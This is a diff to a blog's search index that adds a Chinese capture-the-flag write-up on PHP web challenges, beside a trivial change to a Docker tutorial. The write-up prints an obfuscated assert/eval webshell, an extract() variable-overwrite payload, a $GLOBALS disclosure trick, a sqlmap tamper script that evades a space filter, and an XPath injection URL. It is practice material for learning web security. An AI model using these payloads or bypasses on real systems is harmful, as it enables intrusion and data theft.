@@ -4,6 +4,74 @@
   
     
     <entry>
+      <title><![CDATA[month 2 for cnas writeup]]></title>
+      <url>http://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html</url>
+      <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="01-50"><a href="#01-50" class="headerlink" title="01 50"></a>01 50</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="external">http://47.100.121.220:28001/01.php</a></p>
+<h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><p>题目又是大写又是小写的，格式乱乱的，强迫症患了。</p>
+<p>整理下代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__file__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt;</div><div class="line">&lt;?php $k=str_replace(&apos;`&apos;,&apos;&apos;,&apos;a`s`s`e`r`t&apos;);</div><div class="line">$m=$_POST[m];</div><div class="line">if($m==null)</div><div class="line">	header(&apos;status:404&apos;);</div><div class="line">else/**/</div><div class="line">	$k($m);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这里的highlight_file在这里的作用就是读取文件代码的，下面是about.php的源码</p>
+<p>看about的源码这里可以看出m的值为assert</p>
+<p>最后的就相当于执行\$assert(\$m)，assert()执行代码。</p>
+<p>传入system()函数来读取文件即可。</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_1.png" alt=""></p>
+<h2 id="02-50"><a href="#02-50" class="headerlink" title="02 50"></a>02 50</h2><h3 id="题目链接-1"><a href="#题目链接-1" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28002/02.php" target="_blank" rel="external">http://47.100.121.220:28002/02.php</a></p>
+<h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">show_source(__FILE__); </div><div class="line">highlight_file(&apos;about.php&apos;); </div><div class="line">?&gt; &lt;?php </div><div class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </div><div class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </div><div class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </div><div class="line">@$YT($TH^$TU); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这个题目也有highlight_file函数也是用来读about的源码</p>
+<p>这里我们可以直接测试输出这三个变量</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </div><div class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </div><div class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </div><div class="line">echo $YT;</div><div class="line">echo $TH^$TU; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>代码运行得到</p>
+<p>\$YT=assert </p>
+<p>\$TH^\$TUeval($_POST[0x41]);</p>
+<p>0x41是十六进制数，表示的字符是大写字符A，A的ASCII码为65</p>
+<p>这里我用A传参是穿不进去的，用0x41也不行。但是用65可以成功传参</p>
+<p>同样传入system函数执行命令</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_2.png" alt=""></p>
+<h2 id="gift-100"><a href="#gift-100" class="headerlink" title="gift 100"></a>gift 100</h2><h3 id="题目链接-2"><a href="#题目链接-2" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="external">http://47.100.121.220:28003/</a></p>
+<h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><p>右键查看源码可以发现备份文件gift.php.bak</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$flag=&apos;xxx&apos;;</div><div class="line">extract($_GET);</div><div class="line">if(isset($gift))</div><div class="line">&#123;</div><div class="line">	$content=trim(file_get_contents($flag));</div><div class="line">	if($gift==$content)</div><div class="line">	&#123;</div><div class="line">		echo&apos;flag&#123;...&#125;&apos;;</div><div class="line">	&#125;</div><div class="line">	else</div><div class="line">	&#123;</div><div class="line">		echo&apos;Oh..&apos;;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>代码如上，这里考到一个变量覆盖的问题。</p>
+<p>题目使用了extract(\$_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</p>
+<p>GET请求 ?flag=\&amp;gift=，extract()会将\$flag和\$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足\$gift == \$content。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28003/gift.php?flag=&amp;gift=</div></pre></td></tr></table></figure>
+<h2 id="variable-100"><a href="#variable-100" class="headerlink" title="variable 100"></a>variable 100</h2><h3 id="题目链接-3"><a href="#题目链接-3" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28004" target="_blank" rel="external">http://47.100.121.220:28004</a></p>
+<h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">error_reporting(0);</div><div class="line">include &quot;flag.php&quot;;</div><div class="line"></div><div class="line">$s = &quot;You can not get the flag!&lt;/br&gt;&quot;;</div><div class="line">echo $s;</div><div class="line"></div><div class="line">show_source(__FILE__);</div><div class="line"></div><div class="line">if(isset($_GET[&apos;a&apos;])) &#123;</div><div class="line">    $args = $_GET[&apos;a&apos;];</div><div class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args)) &#123;</div><div class="line">        die(&quot;error!&quot;);</div><div class="line">    &#125;</div><div class="line">    eval(&quot;var_dump($$args);&quot;);</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>看代码可以看出我们需要去读flag.php里的变量flag，</p>
+<p>这里变量可以用\$\$这种方式来传入我们的变量a通过var_dump函数来读取</p>
+<p>但是这里是有正则匹配的，传入flag是行不通的，但是我们可以传入GLOBALS</p>
+<p>\$GLOBALS是PHP中的全局变量，用来储存全局作用域中的变量</p>
+<p>所以payload如下，得到flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28004/04.php?a=GLOBALS</div></pre></td></tr></table></figure>
+<h2 id="price-100"><a href="#price-100" class="headerlink" title="price 100"></a>price 100</h2><h3 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28005" target="_blank" rel="external">http://47.100.121.220:28005</a></p>
+<h3 id="解答-4"><a href="#解答-4" class="headerlink" title="解答"></a>解答</h3><p>这个题目纠结了很久，对order by 注入是不熟悉的，这里我找到了一篇关于order by注入的文章</p>
+<p><a href="https://www.cnblogs.com/REscan/p/6884278.html" target="_blank" rel="external"></a></p>
+<p>但是这里看的还是有些不懂的，不知道具体怎么去读取数据库的flag。</p>
+<p>从文章里看出order by 注入是可以直接用sqlmap来跑的</p>
+<p>但是测试可以发现，题目过滤空格和加号的，但是我还是不想手注，</p>
+<p>想用sqlmap只能直接写个tamper了，tamper原来里面是有把空格变换成加号的脚本的。</p>
+<p>但是这里加号也是过滤了的，我们只需要把tamper里的space2plus.py修改一下即可。</p>
+<p>这里我们可以用%09来绕过</p>
+<p>tamper 代码具体如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">from lib.core.enums import PRIORITY</div><div class="line"></div><div class="line">__priority__ = PRIORITY.LOW</div><div class="line"></div><div class="line">def dependencies():</div><div class="line">    pass</div><div class="line"></div><div class="line">def tamper(payload, **kwargs):</div><div class="line">    retVal = payload</div><div class="line"></div><div class="line">    if payload:</div><div class="line">        retVal = &quot;&quot;</div><div class="line">        quote, doublequote, firstspace = False, False, False</div><div class="line"></div><div class="line">        for i in xrange(len(payload)):</div><div class="line">            if not firstspace:</div><div class="line">                if payload[i].isspace():</div><div class="line">                    firstspace = True</div><div class="line">                    retVal += &quot;%09&quot;</div><div class="line">                    continue</div><div class="line"></div><div class="line">            elif payload[i] == &apos;\&apos;&apos;:</div><div class="line">                quote = not quote</div><div class="line"></div><div class="line">            elif payload[i] == &apos;&quot;&apos;:</div><div class="line">                doublequote = not doublequote</div><div class="line"></div><div class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</div><div class="line">                retVal += &quot;%09&quot;</div><div class="line">                continue</div><div class="line"></div><div class="line">            retVal += payload[i]</div><div class="line"></div><div class="line">    return retVal</div></pre></td></tr></table></figure>
+<p>这里我们用这个脚本就能跑sqlmap了</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_3.png" alt=""></p>
+<h2 id="hello-100"><a href="#hello-100" class="headerlink" title="hello    100"></a>hello    100</h2><h3 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="http://47.100.121.220:28006" target="_blank" rel="external">http://47.100.121.220:28006</a></p>
+<h3 id="解答-5"><a href="#解答-5" class="headerlink" title="解答"></a>解答</h3><p>这个题拿到手是没有什么思路的，</p>
+<p>但是做题之前之前习惯用burpsuit抓个包，利用scan扫一下的。</p>
+<p>发现提示存在xpath注入</p>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/m2_4.png" alt=""></p>
+<p>这里的payload还爆出了三个类似用户名的信息</p>
+<p>这个是HCTF 2015的一个原题，题目的把用户名改了</p>
+<p>但是burpsuit已经帮我爆出了用户名。</p>
+<p>修改下writeup的payload就可以得到flag了</p>
+<p>具体的等考完试，看看xpath注入的内容结合题目源码去理解原理。</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.100.121.220:28006/06.php?name=nari%27]|//*|user[user=%27ctfer</div></pre></td></tr></table></figure>]]></content>
+    </entry>
+    
+    <entry>
       <title><![CDATA[week 7 for cnas writeup]]></title>
       <url>http://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html</url>
       <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
@@ -1025,7 +1093,7 @@
 <h2 id="使用commit命令从容器的修改中创建镜像"><a href="#使用commit命令从容器的修改中创建镜像" class="headerlink" title="使用commit命令从容器的修改中创建镜像"></a>使用commit命令从容器的修改中创建镜像</h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</div></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#102;&#x6f;&#x6f;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;">&#102;&#x6f;&#x6f;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#111;&#x3a;&#102;&#111;&#111;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;">&#102;&#111;&#111;&#64;&#98;&#x61;&#x72;&#x2e;&#x63;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2 id="使用diff命令检查容器文件的修改"><a href="#使用diff命令检查容器文件的修改" class="headerlink" title="使用diff命令检查容器文件的修改"></a>使用diff命令检查容器文件的修改</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker diff hello-nginx</div></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2 id="使用inspect命令查看详细信息"><a href="#使用inspect命令查看详细信息" class="headerlink" title="使用inspect命令查看详细信息"></a>使用inspect命令查看详细信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo docker inspect hello-nginx</div></pre></td></tr></table></figure>
